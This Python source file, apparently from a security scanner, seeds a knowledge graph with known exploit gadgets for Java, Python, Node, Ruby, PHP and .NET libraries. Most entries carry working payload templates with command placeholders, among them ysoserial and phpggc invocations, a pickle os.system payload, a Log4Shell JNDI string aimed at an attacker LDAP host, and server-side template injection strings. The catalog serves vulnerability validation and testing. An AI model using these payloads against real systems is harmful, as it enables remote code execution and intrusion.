"""
Known-gadget catalog.

Real-world exploit chains pre-known for specific library/version combinations.
Seeded into the KG at scan start so validators and chain-builder can match
"the app has commons-collections 3.x AND uses ObjectInputStream → ysoserial
CommonsCollections1 works" — a fact that's MUCH faster than re-deriving.

Each gadget has a poc_template with $TOKEN placeholders the validator can
substitute when crafting a PoC.
"""
from __future__ import annotations

from lacuna.kg.client import Gadget


def all_gadgets() -> list[Gadget]:
    """Return the full seed catalog."""
    out: list[Gadget] = []
    out.extend(_java_gadgets())
    out.extend(_python_gadgets())
    out.extend(_node_gadgets())
    out.extend(_ruby_gadgets())
    out.extend(_php_gadgets())
    out.extend(_dotnet_gadgets())
    return out


def _java_gadgets() -> list[Gadget]:
    return [
        Gadget(
            id="java-cc1",
            language="java",
            library="commons-collections",
            version_range=">=3.1,<3.2.2",
            gadget_name="CommonsCollections1",
            impact="rce",
            notes_md=(
                "ysoserial CommonsCollections1 — works when commons-collections "
                "3.1 ≤ v < 3.2.2 is on the classpath AND a deserialization "
                "sink (ObjectInputStream.readObject, JNDI lookup, RMI) "
                "accepts attacker bytes."
            ),
            poc_template=(
                "ysoserial CommonsCollections1 '$CMD' | base64 -w 0"
            ),
            references=[
                "https://github.com/frohoff/ysoserial",
                "https://commons.apache.org/proper/commons-collections/security-reports.html",
            ],
        ),
        Gadget(
            id="java-cc6",
            language="java",
            library="commons-collections",
            version_range="*",
            gadget_name="CommonsCollections6",
            impact="rce",
            notes_md=(
                "Works on commons-collections 3.x and 4.x without the "
                "InvokerTransformer fix. Many app servers ship it."
            ),
            poc_template="ysoserial CommonsCollections6 '$CMD' | base64 -w 0",
            references=["https://github.com/frohoff/ysoserial"],
        ),
        Gadget(
            id="java-cb1",
            language="java",
            library="commons-beanutils",
            version_range="*",
            gadget_name="CommonsBeanutils1",
            impact="rce",
            notes_md=(
                "Works when commons-beanutils + commons-collections + "
                "commons-logging are all on classpath; common in Spring."
            ),
            poc_template="ysoserial CommonsBeanutils1 '$CMD' | base64 -w 0",
            references=["https://github.com/frohoff/ysoserial"],
        ),
        Gadget(
            id="java-snakeyaml",
            language="java",
            library="snakeyaml",
            version_range="<2.0",
            gadget_name="SnakeYAML !!javax.script.ScriptEngineManager",
            impact="rce",
            notes_md=(
                "snakeyaml <2.0 with default SafeConstructor disabled can be "
                "fed `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [...]]` "
                "to load a remote JAR."
            ),
            poc_template=(
                "!!javax.script.ScriptEngineManager "
                "[!!java.net.URLClassLoader [[!!java.net.URL [\"$URL\"]]]]"
            ),
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-1471"],
        ),
        Gadget(
            id="java-log4shell",
            language="java",
            library="log4j-core",
            version_range=">=2.0,<2.17.1",
            gadget_name="Log4Shell JNDI lookup",
            impact="rce",
            notes_md=(
                "JNDI lookup expansion in log4j-core. If user input flows to "
                "any logger.* call (e.g. UA, X-Forwarded-For), exploitation "
                "is via ${jndi:ldap://attacker/x}."
            ),
            poc_template="${jndi:ldap://$ATTACKER/$TOKEN}",
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        ),
        Gadget(
            id="java-spring4shell",
            language="java",
            library="spring-beans",
            version_range=">=5.0,<5.3.18",
            gadget_name="Spring4Shell — class.module.classLoader manipulation",
            impact="rce",
            notes_md=(
                "JDK 9+ Spring data-binding via specially-crafted "
                "class.module.classLoader.resources... params writes a JSP "
                "shell."
            ),
            poc_template=(
                "class.module.classLoader.resources.context.parent.pipeline."
                "first.pattern=$JSP_BODY"
            ),
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
        ),
    ]


def _python_gadgets() -> list[Gadget]:
    return [
        Gadget(
            id="py-pickle-rce",
            language="python",
            library="pickle",
            version_range="*",
            gadget_name="pickle.loads → __reduce__ RCE",
            impact="rce",
            notes_md=(
                "Any pickle.loads on attacker-controlled bytes is RCE. The "
                "classic payload abuses __reduce__ to return os.system."
            ),
            poc_template=(
                "python -c \"import pickle, os, base64; "
                "print(base64.b64encode(pickle.dumps(type('e',(),"
                "{'__reduce__':lambda s:(os.system,('$CMD',))})())).decode())\""
            ),
            references=["https://docs.python.org/3/library/pickle.html#restrict-globals"],
        ),
        Gadget(
            id="py-yaml-load-rce",
            language="python",
            library="pyyaml",
            version_range="<5.1",
            gadget_name="yaml.load !!python/object/apply:os.system",
            impact="rce",
            notes_md=(
                "yaml.load (without SafeLoader) instantiates arbitrary Python "
                "via !!python/object/apply tags."
            ),
            poc_template="!!python/object/apply:os.system [\"$CMD\"]",
            references=["https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"],
        ),
        Gadget(
            id="py-jinja2-ssti",
            language="python",
            library="jinja2",
            version_range="*",
            gadget_name="Jinja2 SSTI ({{config.__class__...}})",
            impact="rce",
            notes_md=(
                "If user input is passed to render_template_string OR if a "
                "template includes `{{user_input}}` without `|e`, the full "
                "Python sandbox is reachable via builtins traversal."
            ),
            poc_template=(
                "{{cycler.__init__.__globals__.os.popen('$CMD').read()}}"
            ),
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"],
        ),
        Gadget(
            id="py-werkzeug-debug-pin",
            language="python",
            library="werkzeug",
            version_range="*",
            gadget_name="Werkzeug debugger PIN bypass",
            impact="rce",
            notes_md=(
                "If FLASK_DEBUG=1 or app.debug=True in production, the "
                "Werkzeug debugger is exposed at /console. The PIN is "
                "derived from machine-id + uuid.getnode() + app path — all "
                "leakable. Then console = Python REPL as the web user."
            ),
            poc_template="/console (then compute PIN from leaked machine-id)",
            references=["https://werkzeug.palletsprojects.com/en/3.0.x/debug/"],
        ),
        Gadget(
            id="py-celery-pickle",
            language="python",
            library="celery",
            version_range="<5.3",
            gadget_name="Celery default pickle serializer",
            impact="rce",
            notes_md=(
                "Older Celery defaults to pickle for task serialization. "
                "Anyone who can publish to the broker (Redis/RabbitMQ) gets RCE."
            ),
            poc_template="<publish pickle-payload to celery queue>",
            references=["https://docs.celeryq.dev/en/stable/userguide/security.html"],
        ),
    ]


def _node_gadgets() -> list[Gadget]:
    return [
        Gadget(
            id="node-prototype-pollution-lodash",
            language="javascript",
            library="lodash",
            version_range="<4.17.21",
            gadget_name="lodash prototype pollution via _.merge",
            impact="prototype_pollution",
            notes_md=(
                "Older lodash _.merge / _.set / _.zipObjectDeep do not "
                "check for __proto__ keys, enabling chain attacks (auth "
                "bypass via isAdmin, RCE via constructor.prototype, etc.)"
            ),
            poc_template=(
                '{"__proto__":{"isAdmin":true}}  // or '
                '{"constructor":{"prototype":{"isAdmin":true}}}'
            ),
            references=["https://nvd.nist.gov/vuln/detail/CVE-2019-10744"],
        ),
        Gadget(
            id="node-serialize",
            language="javascript",
            library="node-serialize",
            version_range="*",
            gadget_name="node-serialize unserialize() with _$$ND_FUNC$$_",
            impact="rce",
            notes_md=(
                "Any call to unserialize() on attacker input is RCE via "
                "embedded JS function via _$$ND_FUNC$$_ tag."
            ),
            poc_template=(
                '{"a":"_$$ND_FUNC$$_function(){require(\'child_process\')'
                '.exec(\'$CMD\')}()"}'
            ),
            references=["https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"],
        ),
        Gadget(
            id="node-handlebars-ssti",
            language="javascript",
            library="handlebars",
            version_range="<4.7.7",
            gadget_name="Handlebars SSTI via lookup helper",
            impact="rce",
            notes_md=(
                "Older Handlebars allows constructor traversal via the "
                "`lookup` helper, breaking out of the sandbox into the JS "
                "runtime."
            ),
            poc_template=(
                "{{#with \"s\" as |string|}}{{#with split as |conslist|}}"
                "{{this.pop}}{{this.push (lookup string.sub.apply 0)}}"
                "{{this.pop}}{{#with string.split as |codelist|}}"
                "{{this.pop}}{{this.push \"return require('child_process')."
                "exec('$CMD');\"}}{{this.pop}}{{#each conslist}}{{#with "
                "(string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}"
                "{{/with}}{{/with}}{{/with}}"
            ),
            references=["https://nvd.nist.gov/vuln/detail/CVE-2019-19919"],
        ),
        Gadget(
            id="node-event-stream-flatmap",
            language="javascript",
            library="event-stream",
            version_range="3.3.6",
            gadget_name="event-stream supply-chain (flatmap-stream)",
            impact="supply_chain",
            notes_md=(
                "Historic supply-chain compromise — sanity-check for "
                "transitive dependency on this version."
            ),
            poc_template="<no PoC — historical supply-chain only>",
            references=["https://github.com/dominictarr/event-stream/issues/116"],
        ),
    ]


def _ruby_gadgets() -> list[Gadget]:
    return [
        Gadget(
            id="ruby-rails-marshal",
            language="ruby",
            library="rails",
            version_range="*",
            gadget_name="Rails Marshal.load with secret_key_base leak",
            impact="rce",
            notes_md=(
                "Rails sessions/cookies signed-and-encrypted with "
                "secret_key_base; leak → forge → Marshal.load on the "
                "session_id object → universal gadget chain."
            ),
            poc_template="<requires leaked secret_key_base + universal Ruby gadget>",
            references=["https://hackerone.com/reports/473888"],
        ),
        Gadget(
            id="ruby-erb-ssti",
            language="ruby",
            library="erb",
            version_range="*",
            gadget_name="ERB SSTI",
            impact="rce",
            notes_md=(
                "If user input reaches ERB.new(input).result, RCE follows. "
                "Many CMSes inadvertently do this in custom-page features."
            ),
            poc_template="<%= `$CMD` %>",
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"],
        ),
    ]


def _php_gadgets() -> list[Gadget]:
    return [
        Gadget(
            id="php-unserialize-monolog",
            language="php",
            library="monolog",
            version_range="*",
            gadget_name="Monolog unserialize chain",
            impact="rce",
            notes_md=(
                "PHPGGC has working chains for Monolog when present + an "
                "unserialize() sink. Composer-installed Laravel apps almost "
                "always ship Monolog."
            ),
            poc_template="phpggc Monolog/RCE1 system '$CMD' -b",
            references=["https://github.com/ambionics/phpggc"],
        ),
        Gadget(
            id="php-laravel-debug",
            language="php",
            library="laravel",
            version_range="*",
            gadget_name="Laravel APP_DEBUG=true + Ignition RCE (CVE-2021-3129)",
            impact="rce",
            notes_md=(
                "Old Ignition + APP_DEBUG=true allows log-poison-then-load "
                "chain (CVE-2021-3129). Sanity-check production envs."
            ),
            poc_template="<see CVE-2021-3129 PoC>",
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-3129"],
        ),
    ]


def _dotnet_gadgets() -> list[Gadget]:
    return [
        Gadget(
            id="dotnet-binaryformatter",
            language="csharp",
            library="System.Runtime.Serialization",
            version_range="*",
            gadget_name="BinaryFormatter.Deserialize",
            impact="rce",
            notes_md=(
                "Any BinaryFormatter.Deserialize on attacker bytes is RCE; "
                "ysoserial.net has dozens of gadgets (TextFormattingRunProperties, "
                "PSObject, DataSet etc.)."
            ),
            poc_template="ysoserial.net -g TextFormattingRunProperties -c '$CMD' -f BinaryFormatter -o base64",
            references=["https://github.com/pwntester/ysoserial.net"],
        ),
        Gadget(
            id="dotnet-json.net-typehandling",
            language="csharp",
            library="Newtonsoft.Json",
            version_range="*",
            gadget_name="Newtonsoft.Json TypeNameHandling=All",
            impact="rce",
            notes_md=(
                "JsonSerializerSettings.TypeNameHandling != None lets "
                "$type field in JSON instantiate arbitrary classes — full "
                "ysoserial.net gadget set applies."
            ),
            poc_template=(
                '{"$type":"System.Windows.Data.ObjectDataProvider, '
                'PresentationFramework, Version=4.0.0.0, Culture=neutral, '
                'PublicKeyToken=31bf3856ad364e35","MethodName":"Start",'
                '"ObjectInstance":{"$type":"System.Diagnostics.Process, '
                'System, Version=4.0.0.0",...}}'
            ),
            references=["https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html"],
        ),
    ]


def seed_into_kg() -> int:
    """Seed all known gadgets into the KG. Idempotent (INSERT OR REPLACE).
    Returns count of gadgets seeded.
    """
    from lacuna.kg import open_kg
    gadgets = all_gadgets()
    kg = open_kg()
    try:
        kg.seed_gadgets(gadgets)
        return len(gadgets)
    finally:
        kg.close()
